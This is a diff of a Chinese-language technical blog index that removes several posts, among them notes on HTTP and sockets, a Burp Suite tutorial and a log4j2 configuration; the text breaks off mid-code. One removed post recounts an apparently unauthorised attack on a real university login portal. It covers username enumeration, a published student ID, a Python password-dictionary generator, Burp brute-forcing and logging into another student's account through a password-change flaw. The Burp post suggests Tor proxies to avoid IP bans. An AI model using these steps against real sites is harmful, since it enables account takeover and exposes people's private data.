+  
     <article id="post-wheels/java/hashutil" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -380,645 +958,9 @@
 
 
   
-    <article id="post-base/httpandsocket/http与socket" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/24/base/httpandsocket/http与socket/">Http与Socket</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/24/base/httpandsocket/http与socket/" class="archive-article-date">
-  	<time datetime="2018-12-24T02:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h4><p>今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br><br>不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。</p>
-<h4 id="2-OSI七层模型"><a href="#2-OSI七层模型" class="headerlink" title="2.OSI七层模型"></a>2.OSI七层模型</h4><p><img src="./osi_七层模型.jpg" alt="OSI"><br>图片来自:<a href="https://www.jianshu.com/p/a18a5ba78fad" target="_blank" rel="noopener">https://www.jianshu.com/p/a18a5ba78fad</a></p>
-<h4 id="3-Http与Socket所在层"><a href="#3-Http与Socket所在层" class="headerlink" title="3.Http与Socket所在层"></a>3.Http与Socket所在层</h4><p>Http：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br></p>
-<p>Tcp/Udp: 传输层。<br></p>
-<p>Ip: 网络层.<br></p>
-<p>Socket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br></p>
-<p>Port: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br></p>
-<h4 id="4-数据的处理流程"><a href="#4-数据的处理流程" class="headerlink" title="4.数据的处理流程"></a>4.数据的处理流程</h4><ul>
-<li>1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。</li>
-<li>2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。</li>
-<li>3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。</li>
-<li>4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.</li>
-<li>5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。</li>
-</ul>
-<h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h4><ul>
-<li>1.Http是应用层协议，Socket是对Tcp/Ip的封装</li>
-<li>2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)</li>
-<li>3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。</li>
-<li>4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">protocol</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/24/base/httpandsocket/http与socket/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-security/example/cdnu-example-login" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/18/security/example/cdnu-example-login/">一个渗透小例子</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/18/security/example/cdnu-example-login/" class="archive-article-date">
-  	<time datetime="2018-12-18T07:54:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。<br><img src="./index_page.png" alt="indexPage"></p>
-<h4 id="1-找到薄弱点"><a href="#1-找到薄弱点" class="headerlink" title="1.找到薄弱点"></a>1.找到薄弱点</h4><p>官网一般相对安全一点，所以通常从子域名下手。<br><br>chrome搜索，输入: inurl:cdnu.edu.cn</p>
-<p><img src="./search_page.png" alt="searchPage"></p>
-<p>看到一个身份认证平台<br><br>一般这些都是后台登录界面<br><br>点进去<br><img src="./login_page.png" alt="searchPage"></p>
-<p>可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。</p>
-<h4 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h4><p>为了能进行爆破，先要得到学号。<br><br>直接google和百度.<br><img src="./studentid_search_01.png" alt="searchPage"></p>
-<p><img src="./studentid_search_02.png" alt="searchPage"></p>
-<p><img src="./studentid_search_03.png" alt="searchPage"></p>
-<p>可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br></p>
-<p>尝试登录：160003021029/123456<br><br>返回:用户名或密码错误。到这还看不出什么<br><br>再尝试输入: 160000000000/123456<br><br>返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br></p>
-<p>在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br></p>
-<p>接下来该进行爆破了，先生成身份证后六位的密码字典.<br><br>因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"># ##########################</span><br><span class="line"># 生成身份证后六位的密码字典</span><br><span class="line"># ##########################</span><br><span class="line">year_start = input(&quot;请输入开始年份(四位): &quot;)</span><br><span class="line">year_end = input(&quot;请输入结束年份(四位):&quot;)</span><br><span class="line"></span><br><span class="line">if len(year_start) != 4 or len(year_end) != 4:</span><br><span class="line">    print(&quot;输入格式有误&quot;)</span><br><span class="line">    exit(-1)</span><br><span class="line">else:</span><br><span class="line">    year_count = abs(int(year_end) - int(year_start)) + 1</span><br><span class="line">    file_path = os.getcwd() + &quot;/&quot; + year_start + &quot;-&quot; + year_end + &quot;dict.txt&quot;</span><br><span class="line">    f = open(file_path, &quot;a+&quot;)</span><br><span class="line">    for index in range(0, year_count):</span><br><span class="line">        res = []</span><br><span class="line">        if year_start &lt; year_end:</span><br><span class="line">            list_temp = []</span><br><span class="line">            for i in range(0, 10000):</span><br><span class="line">                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class="line">                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class="line">                f.write(&quot;\n&quot;)</span><br><span class="line">            res.append(list_temp)</span><br><span class="line">        else:</span><br><span class="line">            for i in range(0, 9999):</span><br><span class="line">                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class="line">                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class="line">                f.write(&quot;\n&quot;)</span><br><span class="line">            res.append(list_temp)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure></p>
-<h4 id="3-进行尝试"><a href="#3-进行尝试" class="headerlink" title="3.进行尝试"></a>3.进行尝试</h4><p>使用burpsuite抓包，然后进行爆破<br><br>没有成功<br><br>换弱密码top100,再次尝试。<br></p>
-<p><img src="./password_success.png" alt="searchPage"></p>
-<p>这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).</p>
-<p><img src="./password_modify.png" alt="searchPage"></p>
-<p>出现此界面，修改密码。</p>
-<p><img src="./login_success.png" alt="searchPage"></p>
-<p>nice,登录成功。<br></p>
-<p>注销登录，换(160003021030/12345)再次尝试<br><br>发现再次出现修改密码界面。<br><br>160003021030/123 再次尝试，并没此问题.<br></p>
-<p>由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br></p>
-<p>右击登录按钮，检查元素，查看源代码.<br><br><img src="./code_logic.png" alt="searchPage"></p>
-<p><img src="./code_logic_02.png" alt="searchPage"></p>
-<p>可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br><br>到此，因为没有挂代理，不敢进行下一步操作。</p>
-<h4 id="4-事后分析"><a href="#4-事后分析" class="headerlink" title="4.事后分析"></a>4.事后分析</h4><ul>
-<li>网站登录没有验证码，给了爆破利用空间。<br></li>
-<li>网站登录返回信息处理失误，应统一返回用户或密码出错。<br></li>
-<li>网站逻辑处理有漏洞，如更改密码不需要旧密码。<br></li>
-<li>网站敏感信息能被看到<br></li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">security</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/18/security/example/cdnu-example-login/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-security/burpsuite/burpsuite" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/12/security/burpsuite/burpsuite/">burpsuite</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/12/security/burpsuite/burpsuite/" class="archive-article-date">
-  	<time datetime="2018-12-12T02:48:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-配置"><a href="#1-配置" class="headerlink" title="1.配置"></a>1.配置</h4><p>先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br><br>  <img src="./image/chrome_proxy.png" alt="proxy_1"></p>
-<p>  <img src="./image/chrome_proxy2.png" alt="proxy_1_1"></p>
-<p>再配置burpsuite监听这个端口的流量<br><br>  <img src="./image/burpsuite_proxy.png" alt="proxy_2"></p>
-<p>此外 ，因为要访问https,配置完这些后，打开浏览器访问<a href="http://burp，下载证书，安装到受信任颁发机构" target="_blank" rel="noopener">http://burp，下载证书，安装到受信任颁发机构</a><br><br><img src="./image/burpsuite_ca_certificate.png" alt="proxy_3"><br><img src="./image/ca_certificate_install.png" alt="proxy_3_1"></p>
-<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><h5 id="1-第一个抓包小例子"><a href="#1-第一个抓包小例子" class="headerlink" title="1.第一个抓包小例子"></a>1.第一个抓包小例子</h5><p>1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个<a href="http://usr.005.tv/User/login.html" target="_blank" rel="noopener">http://usr.005.tv/User/login.html</a><br><img src="./image/usr005tv_login_page1.png" alt="login_page_1"><br>先点击注册<br><img src="./image/usr005tv_register1.png" alt="register_page_1"></p>
-<p><br><br><strong>其中我们邮箱和手机号都是填的假号码。<br>然后开始拦截抓包，滑动滑块</strong></p>
-<p><img src="./image/usr005tv_package_1.png" alt="package1"><br>修改号码为自己手机号，收到验证码<br><img src="./image/usr005tv_package_2.png" alt="package1"><br>输入验证码<br><img src="./image/usr005tv_package_3.png" alt="package1"><br>在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。</p>
-<h5 id="2-一个爆破小例子"><a href="#2-一个爆破小例子" class="headerlink" title="2.一个爆破小例子"></a>2.一个爆破小例子</h5><p>来dvwn的登录（admin/password）<br><img src="./image/dvwn_login_1.png" alt="intruder_01"><br>随便输入，抓取数据包，send to intruder<br><img src="./image/burpsuite_intruder_01.png" alt="intruder_02"><br>选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br><br>然后，clear清空变量，鼠标选中后，add添加自己需要的变量<br><img src="./image/burpsuite_intruder_02.png" alt="intruder_03"><br>分别添加变量对应的字典，进行爆破<br><img src="./image/burpsuite_intruder_03.png" alt="intruder_04"><br>爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)<br><img src="./image/burpsuite_intruder_04.png" alt="intruder_05"></p>
-<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>1.使用burpsuite抓包后，vpn没用了，不能访问外网<br></p>
-<p>解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br></p>
-<p>2018/12/20 添加:<br><br>解决2，使用代理链 <a href="https://www.anquanke.com/post/id/85925" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85925</a><br><br>同理，也可以使用代理链来用tor进行代理(防封ip)<br><img src="./image/proxy_chain_01.png" alt="proxy_chain_01"><br>不稳定，容易出错：SOCKS server general failure<br><br>原因待查。。。</p>
-<h4 id="3-返回包修改与抓手机包"><a href="#3-返回包修改与抓手机包" class="headerlink" title="3.返回包修改与抓手机包"></a>3.返回包修改与抓手机包</h4><h6 id="3-1修改返回包"><a href="#3-1修改返回包" class="headerlink" title="3.1修改返回包"></a>3.1修改返回包</h6><p><img src="./image/modify_response.png" alt="modify_response"><br>点击拦截后, forward会将返回结果拦截，然后自己进行修改。<br><br>再次点击forward将修改完的数据返回给原请求。</p>
-<h6 id="3-2抓取手机http流量"><a href="#3-2抓取手机http流量" class="headerlink" title="3.2抓取手机http流量"></a>3.2抓取手机http流量</h6><p>https需要配置证书，其它一样。<br><br>手机和burp在同一局域网下<br><br><img src="./image/intercept_mobile.png" alt="intercept_mobile"><br>配置burp监听本机ip,端口随意<br><br>到手机设置里面，对连接的wifi进行修改。选择连接的wifi-&gt;显示高级选项-&gt;选择代理(手动)-&gt;<br>配置ip和端口(上一步burp中设置的)-&gt;ip(DHCP)。<br><br>现在可以到burp中进行抓包了<br></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">security</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/12/security/burpsuite/burpsuite/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/springboot架子" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/23/java/springboot架子/">springboot项目架子</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/23/java/springboot架子/" class="archive-article-date">
-  	<time datetime="2018-11-23T07:47:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="springboot架子搭建"><a href="#springboot架子搭建" class="headerlink" title="springboot架子搭建"></a>springboot架子搭建</h3><h4 id="1-日志"><a href="#1-日志" class="headerlink" title="1.日志"></a>1.日志</h4><h5 id="（1）log4j2"><a href="#（1）log4j2" class="headerlink" title="（1）log4j2"></a>（1）log4j2</h5><ul>
-<li><p>依赖</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--引入log4j2--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!--log4j2依赖于disruptor--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.lmax&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;disruptor&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.4.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置文件log4j2.xml<br>log4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，</span><br><span class="line">    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)</span><br><span class="line">  --&gt;</span><br><span class="line">&lt;Configuration status=&quot;INFO&quot;&gt;</span><br><span class="line">    &lt;!-- 日志文件目录和压缩文件目录配置 --&gt;</span><br><span class="line">    &lt;Properties&gt;</span><br><span class="line">        &lt;Property name=&quot;fileName&quot;&gt;C:\\Users\\xiong\\Desktop\\log\\log4j2&lt;/Property&gt;</span><br><span class="line">        &lt;Property name=&quot;fileGz&quot;&gt;C:\\Users\\xiong\\Desktop\\log\\log4j2\\7z&lt;/Property&gt;</span><br><span class="line">    &lt;/Properties&gt;</span><br><span class="line">    &lt;!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式--&gt;</span><br><span class="line">    &lt;Appenders&gt;</span><br><span class="line">        &lt;!-- 输出控制台日志的配置 --&gt;</span><br><span class="line">        &lt;Console name=&quot;console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">            &lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）--&gt;</span><br><span class="line">            &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt;</span><br><span class="line">            &lt;!-- 输出日志的格式 --&gt;</span><br><span class="line">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class="line">        &lt;/Console&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 --&gt;</span><br><span class="line">        &lt;RollingRandomAccessFile name=&quot;infoFile&quot; fileName=&quot;$&#123;fileName&#125;/log-info.log&quot; immediateFlush=&quot;false&quot;</span><br><span class="line">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-info.gz&quot;&gt;</span><br><span class="line">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class="line">            &lt;Policies&gt;</span><br><span class="line">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class="line">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class="line">            &lt;/Policies&gt;</span><br><span class="line">            &lt;Filters&gt;</span><br><span class="line">                &lt;!-- 只记录info和warn级别信息 --&gt;</span><br><span class="line">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;DENY&quot; onMismatch=&quot;NEUTRAL&quot;/&gt;</span><br><span class="line">                &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class="line">            &lt;/Filters&gt;</span><br><span class="line">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class="line">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class="line">        &lt;/RollingRandomAccessFile&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 存储所有error信息 --&gt;</span><br><span class="line">        &lt;RollingRandomAccessFile name=&quot;errorFile&quot; fileName=&quot;$&#123;fileName&#125;/log-error.log&quot; immediateFlush=&quot;false&quot;</span><br><span class="line">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-error.gz&quot;&gt;</span><br><span class="line">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class="line">            &lt;Policies&gt;</span><br><span class="line">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class="line">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class="line">            &lt;/Policies&gt;</span><br><span class="line">            &lt;Filters&gt;</span><br><span class="line">                &lt;!-- 只记录error级别信息 --&gt;</span><br><span class="line">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class="line">            &lt;/Filters&gt;</span><br><span class="line">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class="line">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class="line">        &lt;/RollingRandomAccessFile&gt;</span><br><span class="line">    &lt;/Appenders&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 全局配置，默认所有的Logger都继承此配置 --&gt;</span><br><span class="line">    &lt;Loggers&gt;</span><br><span class="line">        &lt;!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 --&gt;</span><br><span class="line">        &lt;AsyncRoot level=&quot;info&quot; additivity=&quot;false&quot;&gt;</span><br><span class="line">            &lt;AppenderRef ref=&quot;console&quot;/&gt;</span><br><span class="line">            &lt;AppenderRef ref=&quot;infoFile&quot;/&gt;</span><br><span class="line">            &lt;AppenderRef ref=&quot;errorFile&quot;/&gt;</span><br><span class="line">        &lt;/AsyncRoot&gt;</span><br><span class="line">    &lt;/Loggers&gt;</span><br><span class="line">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class TestController &#123;</span><br><span class="line">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;test&quot;, method = RequestMethod.GET)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String test()&#123;</span><br><span class="line">        logger.debug(&quot;test debug&quot;);</span><br><span class="line">        logger.info(&quot;test info&quot;);</span><br><span class="line">        logger.warn(&quot;test warn&quot;);</span><br><span class="line">        logger.error(&quot;test error&quot;);</span><br><span class="line">        logger.fatal(&quot;test fatal&quot;);</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h5 id="logback-默认"><a href="#logback-默认" class="headerlink" title="logback(默认)"></a>logback(默认)</h5><p>在resouces下添加logback-spring.xml配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 